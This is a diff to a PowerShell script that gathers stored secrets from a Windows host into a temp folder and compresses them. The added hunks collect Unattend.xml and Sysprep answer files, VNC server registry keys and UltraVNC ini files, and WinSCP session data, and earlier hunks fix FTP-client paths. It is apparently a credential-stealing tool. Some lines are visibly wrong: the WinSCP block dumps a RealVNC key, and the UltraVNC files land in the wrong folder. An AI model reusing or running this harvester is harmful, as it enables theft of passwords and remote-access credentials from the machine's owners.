@@ -268,7 +268,7 @@ if (Test-Path "$env:userprofile\.ApacheDirectoryStudio\.metadata\.plugins\org.ap
 # CoreFTP
 if (Test-Path "HKCU:\Software\FTPware\CoreFTP\Sites" -PathType Any) {
 	New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/CoreFTP -ItemType Directory
-	Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\Software\FTPware\CoreFTP\Sites > $env:tmp/$FolderName/FTP-FileSync-DB/CoreFTP/data.txt
+	Get-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\FTPware\CoreFTP\Sites > $env:tmp/$FolderName/FTP-FileSync-DB/CoreFTP/data.txt
 }
 
 # Cyberduck
@@ -290,7 +290,7 @@ if (Test-Path "HKCU:\Software\ACS\PuTTY Connection Manager" -PathType Any) {
 	$dbpath = $dbpath | Select-Object DefaultDatabase | Out-String
 	if (Test-Path $dbpath) {
 		New-Item -Path $env:tmp/$FolderName/FTP-FileSync-DB/PCM -ItemType Directory
-		Copy-Item $dbpath "$env:tmp/$FolderName/PCM/" -Recurse
+		Copy-Item $dbpath "$env:tmp/$FolderName/FTP-FileSync-DB/PCM/" -Recurse
 	}
 }
 
@@ -368,6 +368,99 @@ if (Test-Path "$env:localappdata/Microsoft Corporation/Remote Desktop Connection
 	New-Item -Path $env:tmp/$FolderName/RemoteControl/RDCMan -ItemType Directory
 	Copy-Item "$env:localappdata/Microsoft Corporation/Remote Desktop Connection Manager/RDCMan.settings" "$env:tmp/$FolderName/RemoteControl/RDCMan/MSC/" -Recurse
 }
+
+# Unattended
+if (Test-Path "$env:homedrive/Windows/Panther/Unattend.xml" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/Unattended -ItemType Directory
+	Copy-Item "$env:homedrive/Windows/Panther/Unattend.xml" "$env:tmp/$FolderName/RemoteControl/Unattended/" -Recurse
+}
+if (Test-Path "$env:homedrive/Windows/Panther/Unattended.xml" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/Unattended -ItemType Directory
+	Copy-Item "$env:homedrive/Windows/Panther/Unattended.xml" "$env:tmp/$FolderName/RemoteControl/Unattended/" -Recurse
+}
+if (Test-Path "$env:homedrive/Windows/Panther/Unattend/Unattended.xml" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/Unattended -ItemType Directory
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/Unattended/Unattend -ItemType Directory
+	Copy-Item "$env:homedrive/Windows/Panther/Unattend/Unattended.xml" "$env:tmp/$FolderName/RemoteControl/Unattended/Unattend/" -Recurse
+}
+if (Test-Path "$env:homedrive/Windows/Panther/Unattend/Unattend.xml" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/Unattended -ItemType Directory
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/Unattended/Unattend -ItemType Directory
+	Copy-Item "$env:homedrive/Windows/Panther/Unattend/Unattend.xml" "$env:tmp/$FolderName/RemoteControl/Unattended/Unattend/" -Recurse
+}
+if (Test-Path "$env:homedrive/Windows/System32/Sysprep/unattend.xml" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/Unattended -ItemType Directory
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/Unattended/Sysprep -ItemType Directory
+	Copy-Item "$env:homedrive/Windows/System32/Sysprep/unattend.xml" "$env:tmp/$FolderName/RemoteControl/Unattended/Sysprep/" -Recurse
+}
+if (Test-Path "$env:homedrive/Windows/System32/Sysprep/Panther/unattend.xml" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/Unattended -ItemType Directory
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/Unattended/Sysprep -ItemType Directory
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/Unattended/Sysprep/Panther -ItemType Directory
+	Copy-Item "$env:homedrive/Windows/System32/Sysprep/Panther/unattend.xml" "$env:tmp/$FolderName/RemoteControl/Unattended/Sysprep/Panther/" -Recurse
+}
+
+# VNC
+if (Test-Path "HKLM:\Software\Wow6432\RealVNC\WinVNC4" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/VNC -ItemType Directory
+	Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\Software\Wow6432\RealVNC\WinVNC4 > $env:tmp/$FolderName/RemoteControl/VNC/realvnc4-0.txt
+}
+if (Test-Path "HKLM:\Software\RealVNC\vncserver" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/VNC -ItemType Directory
+	Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\Software\RealVNC\vncserver > $env:tmp/$FolderName/RemoteControl/VNC/realvnc3-0.txt
+}
+if (Test-Path "HKLM:\Software\RealVNC\WinVNC4" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/VNC -ItemType Directory
+	Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\Software\RealVNC\WinVNC4 > $env:tmp/$FolderName/RemoteControl/VNC/realvnc4-1.txt
+}
+if (Test-Path "HKCU:\Software\RealVNC\WinVNC4" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/VNC -ItemType Directory
+	Get-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\RealVNC\WinVNC4 > $env:tmp/$FolderName/RemoteControl/VNC/realvnc4-2.txt
+}
+if (Test-Path "HKCU:\Software\ORL\WinVNC3" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/VNC -ItemType Directory
+	Get-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3 > $env:tmp/$FolderName/RemoteControl/VNC/realvnc3-1.txt
+}
+if (Test-Path "HKCU:\Software\TightVNC\Server" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/VNC -ItemType Directory
+	Get-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\TightVNC\Server > $env:tmp/$FolderName/RemoteControl/VNC/tightvnc-0.txt
+}
+if (Test-Path "HKLM:\Software\TightVNC\Server" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/VNC -ItemType Directory
+	Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\Software\TightVNC\Server > $env:tmp/$FolderName/RemoteControl/VNC/tightvnc-1.txt
+}
+if (Test-Path "HKLM:\Software\TigerVNC\Server" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/VNC -ItemType Directory
+	Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\Software\TigerVNC\Server > $env:tmp/$FolderName/RemoteControl/VNC/tigervnc-1.txt
+}
+if (Test-Path "HKCU:\Software\TigerVNC\Server" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/VNC -ItemType Directory
+	Get-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\TigerVNC\Server > $env:tmp/$FolderName/RemoteControl/VNC/tigervnc-0.txt
+}
+if (Test-Path "$env:homedrive/Program Files (x86)/uvnc bvba/UltraVNC/ultravnc.ini" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/VNC -ItemType Directory
+	Copy-Item "$env:homedrive/Program Files (x86)/uvnc bvba/UltraVNC/ultravnc.ini" "$env:tmp/$FolderName/RemoteControl/Unattended/ultravnc-0.ini" -Recurse
+}
+if (Test-Path "$env:homedrive/Program Files/uvnc bvba/UltraVNC/ultravnc.ini" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/VNC -ItemType Directory
+	Copy-Item "$env:homedrive/Program Files/uvnc bvba/UltraVNC/ultravnc.ini" "$env:tmp/$FolderName/RemoteControl/Unattended/ultravnc-1.ini" -Recurse
+}
+if (Test-Path "$env:homedrive/Program Files/UltraVNC/ultravnc.ini" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/VNC -ItemType Directory
+	Copy-Item "$env:homedrive/Program Files/UltraVNC/ultravnc.ini" "$env:tmp/$FolderName/RemoteControl/Unattended/ultravnc-2.ini" -Recurse
+}
+if (Test-Path "$env:homedrive/Program Files (x86)/UltraVNC/ultravnc.ini" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/VNC -ItemType Directory
+	Copy-Item "$env:homedrive/Program Files (x86)/UltraVNC/ultravnc.ini" "$env:tmp/$FolderName/RemoteControl/Unattended/ultravnc-3.ini" -Recurse
+}
+
+# WinSCP
+if (Test-Path "HKCU:\Software\Martin Prikry1\WinSCP 2\Sessions" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/RemoteControl/WinSCP -ItemType Directory
+	Get-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\RealVNC\WinVNC4 > $env:tmp/$FolderName/RemoteControl/WinSCP/sessions.txt
+}
+
+
 
 Compress-Archive -Path $env:tmp/$FolderName/RemoteControl -DestinationPath "$env:tmp/RemoteControl-$ZIP"
 
